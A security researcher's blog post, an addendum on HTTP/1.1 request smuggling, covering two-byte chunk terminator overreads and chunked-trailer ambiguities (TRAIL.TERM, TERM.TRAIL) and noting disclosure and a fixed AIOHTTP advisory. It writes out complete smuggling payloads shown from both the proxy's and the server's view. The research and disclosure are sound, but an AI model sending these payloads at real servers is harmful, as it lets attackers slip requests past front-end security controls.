---
title: "Funky chunks – addendum: a few more dirty tricks"
date: 2025-10-29
---

<style>
.http-line-break {
    background-color: rgba(165, 165, 165, 0.4);
    border-radius: 4px;
    margin: 0px;
    opacity: 0.65;
}

.http-highlight {
    display: block;
    padding: 0px 4px;
    border-radius: 8px;
    margin: 0px -4px;
}

.http-highlight-head {
    display: block;
    padding: 0px 4px;
    border-radius: 1px;
    border-top-left-radius: 8px;
    border-top-right-radius: 8px;
    margin: 0px -4px;
}

.http-highlight-one {
    background-color: #ffc6bf;
}

.http-highlight-two {
    background-color: #bfd3ff;
}

.http-highlight-three {
    background-color: #ffeabf;
}

.http-highlight-one-compl {
    background-color: #ffafa6;
}

.http-highlight-two-compl {
    background-color: #a6c2ff;
}

.http-highlight-three-compl {
    background-color: #ffe1a5;
}

.http-highlight-text {
    font-size: 12px;
    font-style: italic;
    color: #555;
    float: right;
    margin-right: 2px;
    margin-top: 2px;
}

.http-highlight-text-req {
    font-size: 12px;
    font-style: italic;
    color: #555;
    float: right;
    margin-right: 0px;
    margin-top: 0px;
}

.tooltip {
    position: relative;
    display: inline-block;
    cursor: pointer;
}

td {
  vertical-align: top;
  background-color: #fbfbfb;
}

.tooltip .tooltiptext {
    visibility: hidden;
    width: 140px;
    background-color: #f9f9f9;
    color: #333;
    text-align: center;
    border: 1px solid #ddd;
    border-radius: 5px;
    padding: 5px;
    position: absolute;
    z-index: 1;
    bottom: 105%;
    left: 50%;
    margin-left: -70px;
    box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
    opacity: 0;
    transition: opacity 0.2s ease-in-out;
}

.tooltip:hover .tooltiptext {
    visibility: visible;
    opacity: 1;
}
</style>

After revisiting my own recent article introducing a small family of request smuggling techniques, I realized that I had overlooked a few close relatives. In fact, these are in hindsight almost glaringly obvious omissions! To remedy this oversight, I have put together this short note in which we will finally bring these neglected smuggling techniques into focus and welcome them into the family.

In the interest of brevity, I will not include an introduction here. To understand the context of this article, you will therefore need to read the [original one](https://w4ke.info/2025/06/18/funky-chunks) first.

### The curious case of the two-byte terminator
In *Funky chunks: abusing ambiguous chunk line terminators for request smuggling*, we surveyed a series of HTTP/1.1 chunked-body parsing leniencies. One of them, mentioned only briefly, now turns out to be of a different nature than the others – one that gives rise to an entirely new subclass of request smuggling techniques. We will now engage more deeply with this particular leniency.

The leniency in question is the following: *accepting any two bytes as the line terminator of a chunk body*. A parser affected by such a leniency would interpret the highlighted `XX` sequence as a line terminator in the example chunked body below.

<pre><code>d<span class="http-line-break">\r\n</span>
Hello, world!<span class="http-highlight-one-compl" style="padding: 0 0px;">XX</span>
0<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
</code></pre>

This is a fairly common leniency, presumably because *only* the sequence `\r\n` is valid in this location, so a lot of parsers simply advance the cursor by two characters, not bothering to confirm that the sequence is in fact a CRLF. This behavior is (or rather, *was*) exhibited by parsers such as [h11](https://github.com/python-hyper/h11), [uHTTPd](https://github.com/openwrt/uhttpd), and even older versions of [llhttp](https://github.com/nodejs/llhttp). 

Another common leniency in this same location is accepting `\n` as a line terminator, a technically incorrect yet highly prevalent behavior. Perhaps you already see where this is going.

#### The vulnerability
If either of the front-end proxy or the back-end server assumes a two-byte CRLF without checking it, and the other accepts `\n` (or any other one-byte or zero-byte sequence) as a line terminator, __chunk boundaries begin to blur__. To see this, consider what happens when a chunk body with a one-byte line terminator is processed by a parser that carelessly advances two bytes after each chunk body. The parser will inadvertently consume a byte from the subsequent chunk header, corrupting the chunk size. This causes the front-end and back-end parsers to disagree about the size of the next chunk, and this disagreement can be used to achieve – *you guessed it* – HTTP request smuggling.

I count a total of four variants of this new length-based technique:

 - __Front-end overread__: The proxy interprets any two-byte sequence as a line terminator, and the server accepts either some one-byte line terminator (e.g. `\n`) or no line terminator at all.
 - __Back-end overread__: The proxy accepts either some one-byte line terminator (e.g. `\n`) or no line terminator at all, and the server interprets any two-byte sequence as a line terminator.

It is worth noting that the parsing leniencies we are exploiting here are not actually any different from the ones described in my original blog post – these are just additional ways of combining leniencies to obtain a request smuggling primitive.

#### Example: 1-byte front-end overread
To keep things short, we'll only discuss one of these variants in depth. I trust that you, dear reader, will be able to construct an equivalent attack for the other variants, should the need arise.

Let us then consider the arguably most plausible of the four scenarios: a front-end accepting `\n` as a line terminator and a back-end accepting any two-byte sequence. 

<div style="display: flex; gap: 10px;">
<div style="flex: 1;">

<pre><code>GET /one HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">2;<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk header</span>
</span>xx<span class="http-line-break">\n</span><span class="http-highlight-text">chunk body</span>
</span><span class="http-highlight http-highlight-two"><span class="http-highlight-head http-highlight-two-compl">50<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk header</span>
</span><span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk body</span>
GET /two HTTP/1.1<span class="http-line-break">\r\n</span>
Host: localhost<span class="http-line-break">\r\n</span>
X-Pad: AAAAA<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
</span><span class="http-highlight http-highlight-three"><span class="http-highlight-head http-highlight-three-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-line-break">\r\n</span><span class="http-highlight-text"></span>
</span></code></pre>

<p style="text-align: center; font-weight: bold;">ONE interpretation (proxy)</p>
</div>

<div style="flex: 1;">

<pre><code>GET /one HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">2;<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk header</span>
</span>xx<span class="http-line-break">\n</span>5<span class="http-highlight-text">chunk body</span>
</span><span class="http-highlight http-highlight-two"><span class="http-highlight-head http-highlight-two-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-line-break">\r\n</span><span class="http-highlight-text"></span>
</span>GET /two HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #2</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
X-Pad: AAAAA<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-line-break">\r\n</span><span class="http-highlight-text"></span>
</span></code></pre>

<p style="text-align: center; font-weight: bold;">TWO interpretation (server)</p>
</div>

</div>

The front-end interprets the `\n` as a line terminator and `50` as the size of the second chunk. On the back-end, the first byte of the second chunk size is consumed by the server, assuming it to be part of the line terminator. This changes the perceived size of the second chunk from `50` to `0`, causing the server to interpret it as the end of the request. What the front-end considers the content of the second chunk is therefore interpreted as a second pipelined request on the back-end. 

### Funky trailers
We now move on from chunks and chunk sizes and instead turn our attention to another notable feature of HTTP/1.1 chunked encoding, a feature that we foolishly ignored in the original article despite its clear applicability to our request smuggling endeavors: the [chunked trailer section](https://www.rfc-editor.org/rfc/rfc9112.html#name-chunked-trailer-section). 

The trailer section is essentially an optional header section following the last chunk of an HTTP message using chunked encoding. Let's get familiar with the syntax by taking a look at an example.



<div style="margin: auto; width: 420px;">
<pre><code>POST /some/path HTTP/1.1<span class="http-line-break">\r\n</span>
Host: example.com<span class="http-line-break">\r\n</span>
Content-Type: text/plain<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">d<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk header</span>
</span>hello, world!<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk body</span>
</span><span class="http-highlight http-highlight-two"><span class="http-highlight http-highlight-two-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span></span><span class="http-highlight http-highlight-three-compl">Trailer-One: value-one<span class="http-line-break">\r\n</span><span class="http-highlight-text">trailer section</span>
Trailer-Two: value-two<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span></span></code></pre>
</div>

Parsing the trailer section is much like parsing the ordinary HTTP header section, with the exception of one key difference: *a lone newline is __not__ an acceptable line terminator in the chunked trailer section.* As you can imagine, many parsers ignore this difference and interpret a single `\n` as a line terminator anyway, often as a consequence of reusing the header-section parsing logic.

Like chunk extensions, chunked trailers are generally ignored; parsers simply consume them with no regard for the contents. As a result, some parsers simply look for the `\r\n\r\n` sequence that marks the end of the trailer section, effectively allowing any byte (including lone `\n` characters) in the section. 

These two observations lead us to a brand-new set of exploitable parsing leniencies: by placing what one parser interprets as two consecutive line terminators in what another parser interprets as the trailer section, we have once again stumbled upon a new flavor of chunk-based request smuggling.

#### TRAIL.TERM
Consider first the scenario in which the front-end proxy ignores lone `\n` characters in the chunked trailer section, but the back-end web server interprets them as line terminators. In such a scenario, we can smuggle a request past the front-end using the surprisingly simple payload below.

<div style="display: flex; gap: 10px;">
<div style="flex: 1;">

<pre><code>GET /one HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">2<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk header</span>
</span>xx<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk body</span>
</span><span class="http-highlight http-highlight-two-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-highlight http-highlight-three-compl"><span class="http-line-break">\n</span><span class="http-highlight-text">trailer section</span>
GET /two HTTP/1.1<span class="http-line-break">\r\n</span>
Host: localhost<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
</span></code></pre>

<p style="text-align: center; font-weight: bold;">TRAIL interpretation (proxy)</p>
</div>

<div style="flex: 1;">

<pre><code>GET /one HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">2<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk header</span>
</span>xx<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk body</span>
</span><span class="http-highlight http-highlight-two"><span class="http-highlight http-highlight-two-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-line-break">\n</span>
</span>GET /two HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #2</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
</code></pre>

<p style="text-align: center; font-weight: bold;">TERM interpretation (server)</p>
</div>

</div>

The proxy ignores the lone newline following the last chunk, interpreting it as part of the trailer section. It perceives the remaining data – which the back-end interprets as a second request – as a chunked trailer section. Conveniently, the last two consecutive CRLF sequences serve both as the termination of the trailer section and the second pipelined request.

*__Note__: The first chunk is not strictly needed, but experience has taught me that some proxies rewrite requests with an empty body. The first chunk serves to prevent this rewriting behavior.*


#### TERM.TRAIL
As it turns out, the TERM.TRAIL scenario is quite a bit more complicated. Before we deep-dive into why, let's first think about how we may construct an equivalent to the TRAIL.TERM payload above. In doing so, we quickly realize that we cannot *'split'* a request as we usually would, because the *'split'* can only occur on the front-end; we can make the front-end perceive an extra request by placing two ambiguous line terminators in the trailer section, but we cannot do the same for the back-end. 

There is a workaround, though: we can use *two* requests. This would perhaps more accurately be described as *'request merging'* rather than *'request splitting'*, because what the front-end perceives as two separate requests is squashed into a single request on the back-end – not the other way around.

<div style="display: flex; gap: 10px;">
<div style="flex: 1;">

<pre><code>GET /one HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">2<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk header</span>
</span>xx<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk body</span>
</span><span class="http-highlight http-highlight-two"><span class="http-highlight http-highlight-two-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-line-break">\n</span>
</span>GET /two HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #2</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Content-Length: 40<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one">GET /three HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text">request body</span>
Host: localhost<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span></span></code></pre>

<p style="text-align: center; font-weight: bold;">TERM interpretation (proxy)</p>
</div>

<div style="flex: 1;">

<pre><code>GET /one HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #1</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
Transfer-Encoding: chunked<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
<span class="http-highlight http-highlight-one"><span class="http-highlight-head http-highlight-one-compl">2<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk header</span>
</span>xx<span class="http-line-break">\r\n</span><span class="http-highlight-text">chunk body</span>
</span><span class="http-highlight http-highlight-two-compl">0<span class="http-line-break">\r\n</span><span class="http-highlight-text">last chunk</span>
</span><span class="http-highlight http-highlight-three-compl"><span class="http-line-break">\n</span><span class="http-highlight-text">trailer section</span>
GET /two HTTP/1.1<span class="http-line-break">\r\n</span>
Host: localhost<span class="http-line-break">\r\n</span>
Content-Length: 40<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span>
</span>GET /three HTTP/1.1<span class="http-line-break">\r\n</span><span class="http-highlight-text-req"><b>request #2</b></span>
Host: localhost<span class="http-line-break">\r\n</span>
<span class="http-line-break">\r\n</span></code></pre>

<p style="text-align: center; font-weight: bold;">TRAIL interpretation (server)</p>
</div>

</div>

Using our two-request technique, it seems we yet again have managed to hide a request from the front-end parser. The back-end sees a trailer section where the front-end sees a second request and as a result, the `Content-Length` header is ignored and the body of the second request is interpreted as a separate request on the back-end.

There is one major problem, however. 

#### The early-response problem
Consider what happens when a proxy receives these two pipelined requests. It will initially only forward what it interprets as the first request, which in turn is interpreted as an incomplete request on the back-end. Consequently, the back-end will not return a response, and the proxy will eventually time out and therefore never forward the second request – the attack fails.

Until recently, I had dismissed TERM.TRAIL as unexploitable due to this inevitable upstream connection timeout. I later discovered that it *is* in fact exploitable against a small subset of web servers like AIOHTTP, Koa, and Actix Web, which respond __before receiving the request body__ (unless the body is explicitly read by the application code). Shortly after this realization, James Kettle introduced the concept of an *[early-response gadget](https://portswigger.net/research/http1-must-die#breaking-the-0.cl-deadlock)* in his [2025 HTTP desync research](https://portswigger.net/research/http1-must-die), proving that even servers like nginx and IIS exhibit early-response behavior when rubbed the right way. Now, I can therefore confidently state that TERM.TRAIL *is* exploitable – with the added caveat that an early-response gadget is required.

Although Kettle's work on early-response focused on 0.CL vulnerabilities, the idea is equally applicable to our TERM.TRAIL case; if the back-end responds early, the proxy will forward the second request, allowing the smuggled request to be delivered. It's worth noting that unlike in 0.CL, we do not have to worry about the lengths of any request headers added by the front-end. 


### Any more bounties...?
Armed with our newfound knowledge, it is only natural to wonder whether any more bounties or CVEs might be unearthed using these techniques. Unfortunately, the answer appears to be *not really*.

Since the length-based techniques are only exploitable against parsing behaviors that I have already demonstrated to be dangerous, there are unfortunately no more CVEs to be issued. Scanning for these vulnerabilities across a range of bug bounty targets sadly yielded no results, perhaps partly as a result of having reported these vulnerabilities to a dozen projects months ago.

Regarding trailer-based techniques, TRAIL.TERM remains a theoretical vulnerability, as none of the proxies I've tested exhibited the required parsing behavior. I did identify multiple TERM.TRAIL-vulnerable setups, including even a couple of real-world instances in bug bounty targets, but I was unable to find the necessary early-response gadgets in most cases. The only exploitable setup I did find was AIOHTTP behind Akamai, Imperva, or Google Classic Application LB, which has now been [fixed](https://github.com/aio-libs/aiohttp/security/advisories/GHSA-9548-qrrj-x5pj). Google Cloud even awarded a generous $13,337 bounty for the parsing flaw in their load balancer.

Safe to say, these vulnerabilities are by no means as prevalent as the ones discussed in *Funky chunks*. Nonetheless, I found them interesting to include in this addendum. If you wish to go looking for these vulnerabilities in the wild yourself, I've updated [smugchunks](https://github.com/JeppW/smugchunks) with more blind detection payloads.

